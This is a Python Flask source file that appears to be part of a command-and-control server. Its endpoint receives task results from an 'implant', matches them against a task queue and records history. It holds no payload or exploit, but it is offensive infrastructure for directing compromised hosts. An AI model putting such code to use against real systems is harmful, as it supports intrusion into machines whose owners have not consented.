import uuid
import json

from flask import request, Response
from flask_restful import Resource

from database.models import Task, Result, TaskHistory
from common.parse_utils import parse_request
from common.types.task_types import Status


class Results(Resource):
    """
    Description

    Methods
    -------
    get  : returns all results objects to user (-> CLI)
    post : adds result(s) to the database      (implant ->)
    """

    # List results
    def get(self):
        # Get all the results and return them to the user
        # Server -> CLI
        results = Result.objects().to_json()
        return Response(results, mimetype="application/json", status=200)

    def post(self):
        """
        POST Request Example
        --------------------

        POST /results HTTP/1.1
        Host: 127.0.0.1:5000
        Content-Type: application/json

        [
            {
                "task_id": "413eb27e-4dfb-4cfd-8a50-87d11afb558b",
                "contents": "response from host",
                "success": true
            }
        ]

        """
        print("[!] REQUEST: '/results (POST)'")
        # Parse the request into json
        json_obj, _ = parse_request(request.get_json())
        print(f"results json_obj => {json_obj}")
        json_obj = json_obj[0]
        json_obj['result_id'] = str(uuid.uuid4())
        # get head of queue (this and next_task share functionality)
        head = Task.objects().order_by('date')
        if not head:
            print("[!] Queue is empty")
            error = {"status code": "400", "error": "empty queue"}
            return Response(json.dumps(error), status=400)
        # Convert to json
        json_head = json.loads(head.to_json())[0]
        # Check if the implant executed the Task successfully
        if not json_obj['success']:
            json_head['task_status'] = Status.FAILED.name
        # check task_id's match and check task is executing
        if json_head['task_id'] != json_obj['task_id'] \
                or json_head['task_status'] != Status.EXECUTING.name:
            error = {"status code": "400", "error": "invalid task"}
            return Response(json.dumps(error), status=400)
        task_id = json_obj['task_id']
        # 1. query documents in history collection by task_id
        history_obj = TaskHistory.objects().get(task_id=task_id)
        print(f"History_Obj = {history_obj['task_id']}")
        # Update the corresponding history document
        history_obj['task_status'] = Status.EXECUTED.name
        history_obj['task_results'] = json_obj
        history_obj.save()
        # Delete the Task
        Task.objects().get(task_id=task_id).delete()
        print(f"[!] Task [{task_id}] deleted")
        # Save the result to the database
        Result(**json_obj).save()
        return Response(Result.objects.skip(Result.objects.count() - 1).to_json(),
                        mimetype="application/json",
                        status=200)
